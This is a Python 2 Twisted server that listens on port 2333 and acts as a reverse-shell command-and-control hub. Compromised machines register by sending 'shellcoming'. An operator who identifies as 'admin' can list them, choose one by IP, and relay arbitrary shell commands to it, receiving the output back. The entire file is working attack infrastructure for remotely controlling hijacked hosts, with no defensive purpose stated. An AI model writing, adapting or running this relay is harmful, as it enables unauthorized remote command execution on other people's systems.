import sys
import os

from twisted.internet.protocol import ServerFactory, ProcessProtocol
from twisted.protocols.basic import LineReceiver
from twisted.python import log
from twisted.internet import reactor


global transports
global Admintransport
Admintransport=''
transports=[]
control_client=''



class CmdProtocol(LineReceiver):

  delimiter = '\n'

  def processCmd(self, data):
    global Admintransport
    global transports
    if data.startswith('admin'):
        print self.transport
        Admintransport = self.transport
        print Admintransport.getPeer().host
        log.msg("Admin     %s"%Admintransport)
        for each in transports:
            self.transport.write(str(each.getPeer())+"\n")
    elif data.startswith('exit'):
      self.transport.loseConnection()
    elif data.startswith('shellcoming') :
      log.msg("shell from %s" % self.client_ip)
      transports.append(self.transport)
      self.transport.write('whoami\n')

  def connectionMade(self):
    self.client_ip = self.transport.getPeer()
    log.msg("Client connection from %s" % self.client_ip)
    if len(self.factory.clients) >= self.factory.clients_max:
      log.msg("Too many connections. bye !")
      self.client_ip = None
      self.transport.loseConnection()
    else:
      self.factory.clients.append(self.client_ip)

  def connectionLost(self, reason):
    log.msg('Lost client connection. Reason: %s' % reason)
    if self.client_ip:
      self.factory.clients.remove(self.client_ip)

  def dataReceived(self, data):
    global control_client
    log.msg('Cmd received from %s : %s' % (self.client_ip, data))
    self.processCmd(data)
    if (Admintransport!=''):
	print "from",self.transport.getPeer()
        if (self.transport.getPeer().host==Admintransport.getPeer().host):
            if data.startswith('sc'):
                ip=str(data).split(':')[1]
                print ip
                control_client=ip[:-1]
                self.transport.write("set client ip success\n")
            elif data.startswith('lc'):
                for each in transports:
                    self.transport.write(str(each.getPeer())+"\n")
            elif data.startswith('showcc'):
                    self.transport.write(control_client)
            elif (control_client!=''):
                for each in transports:
                    print len(str(each.getPeer().host))
                    print len(str(control_client))
                    if str(each.getPeer().host)==str(control_client):
                        print "get cc"
                        each.write(data+'\n')
                        print control_client,data,"exec successful\n"
                        break
        elif (len(transports)>0) & (control_client!='') & (str(self.transport.getPeer().host)==control_client):
		print "return result\n"
        	Admintransport.write(data+"\n")

class MyFactory(ServerFactory):

  protocol = CmdProtocol

  def __init__(self, clients_max=10):
    self.clients_max = clients_max
    self.clients = []

log.startLogging(sys.stdout)
reactor.listenTCP(2333, MyFactory(5))
reactor.run()
